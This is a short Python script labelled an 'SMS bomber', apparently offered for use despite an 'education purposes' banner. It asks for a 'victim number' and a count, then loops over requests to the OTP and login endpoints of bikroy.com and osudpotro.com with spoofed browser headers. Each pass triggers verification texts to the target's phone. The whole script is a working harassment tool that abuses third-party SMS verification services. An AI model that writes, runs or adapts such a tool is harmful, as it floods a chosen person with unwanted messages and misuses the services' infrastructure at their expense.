import requests,os


logo=""" 
---------------------------
SMS BOMBER BY ZUYAN
---------------------------
WARNING : EDUCATION PURPOSES 
---------------------------"""

def main():
    os.system('clear')
    print(logo)
    num = input("</>  Enter Victim Number : ")
    limit = int(input("</> Enter Spam Limit : "))
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}"
    header = {
    "method": "GET",
    "authority": "bikroy.com",
    "path": "/data/phone_number_login/verifications/phone_login?phone=01837478901",
    "scheme": "https",
    "application-name": "web",
    "sec-ch-ua-platform": "\"Android\"",
    "accept-language": "bn",
    "sec-ch-ua": "\"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "accept": "application/json, text/plain, */*",
    "dnt": "1",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://bikroy.com/?login-modal=true&redirect-url=/",
    "accept-encoding": "gzip, deflate, br, zstd",
    "cookie": "_ga_LV7HJQBLZX=GS2.1.s1752071506$o11$g1$t1752071739$j55$l0$h0",
    "priority": "u=1, i"
    }
    url1="https://api.osudpotro.com/api/v1/users/send_otp"
    data = {
    "mobile": f"+88-{num}",
    "deviceToken": "web",
    "language": "en",
    "os": "web"
    }
    header1 = {
    "method": "POST",
    "authority": "api.osudpotro.com",
    "path": "/api/v1/users/send_otp",
    "scheme": "https",
    "content-length": "75",
    "sec-ch-ua-platform": "\"Android\"",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "accept": "application/json, text/plain, */*",
    "sec-ch-ua": "\"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "content-type": "application/json;charset=UTF-8",
    "dnt": "1",
    "sec-ch-ua-mobile": "?1",
    "origin": "https://osudpotro.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://osudpotro.com/",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7",
    "priority": "u=1, i"
    }
    for x in range(limit):
        req = requests.get(url,headers=header)
        reqx = requests.post(url1,json=data,headers=header1)
        if reqx:
            print("</> SUCCESS ")
        elif req:
            print("</> SUCCESS ")
        else:
            print("</> Failed ")

        


main()

















